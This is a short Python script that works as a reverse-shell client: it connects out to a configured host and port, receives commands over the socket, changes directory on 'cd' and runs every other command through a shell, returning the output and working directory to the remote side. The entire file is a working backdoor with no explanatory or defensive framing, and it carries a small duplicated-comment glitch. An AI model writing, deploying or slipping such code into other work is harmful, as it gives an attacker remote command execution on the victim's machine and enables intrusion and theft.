import socket
import sys
import os
import subprocess

host = "0.0.0.0" # Ip address of host 
port = 5000
s=socket.socket() # creating socket
try:
    s.connect((host,port)) # binding socket
    while True:
        try:
            msg=s.recv(1024).decode('utf-8')
            if(msg=='q' or not msg):
                print("Connection is closed")
                s.close() # closeclose() # close
                break
            elif msg[:2] == "cd":  # If the server sends a "cd" command
                directory_path = msg[3:].strip('"')  # Remove extra quotes
                if directory_path:  # Check if the directory path is not empty
                    try:
                        os.chdir(directory_path)  # Change the directory
                        s.send(f"Changed directory to {os.getcwd()}".encode('utf-8'))
                    except OSError as e:
                        s.send(f"Error: {str(e)}".encode('utf-8'))  # Send error message back to the server
                else:
                    s.send("Error: No directory specified.".encode('utf-8'))  # Handle case where directory path is empty
            else:
                cmd = subprocess.Popen(msg, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                output_bytes = cmd.stdout.read() + cmd.stderr.read()
                output_string = output_bytes.decode('utf-8')
                current_cd = os.curdir + '>'
                s.send((output_string+os.getcwd()+'>').encode('utf-8'))
                
                print(output_string)
        except ConnectionResetError as e:
            print("Connection was closed by the server:", e)
            break
except KeyboardInterrupt:
    print("Closing socket...")
finally:
    s.close()
        
    
    
